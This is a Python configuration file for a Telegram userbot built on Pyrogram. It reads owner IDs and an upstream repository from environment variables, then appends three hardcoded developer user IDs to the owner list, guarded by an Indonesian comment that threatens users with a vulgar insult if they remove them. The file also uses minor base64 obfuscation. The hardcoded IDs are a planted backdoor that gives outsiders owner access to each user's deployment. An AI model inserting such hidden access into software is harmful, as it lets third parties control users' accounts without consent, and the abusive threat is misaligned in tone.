# Credits : @rencprx

import re
import sys
from os import getenv
from base64 import b64decode
from pyrogram.types import Message
from dotenv import load_dotenv
from pyrogram import filters

load_dotenv()

# Your User ID.
OWNER_ID = list(
    map(int, getenv("OWNER_ID", "").split())
)  # Input type must be interger

UPSTREAM_REPO = getenv(
    "UPSTREAM_REPO",
    "randydev.my.id",
)
UPSTREAM_BRANCH = getenv(
    "UPSTREAM_BRANCH",
    b64decode("ZGV2").decode("utf-8"),
)

# DEVELOPER 
# JANGAN HAPUS DEV ID / GUA GBAN LU KONTOL

OWNER_ID.append(1191668125)
OWNER_ID.append(844432220)
OWNER_ID.append(1939846254)
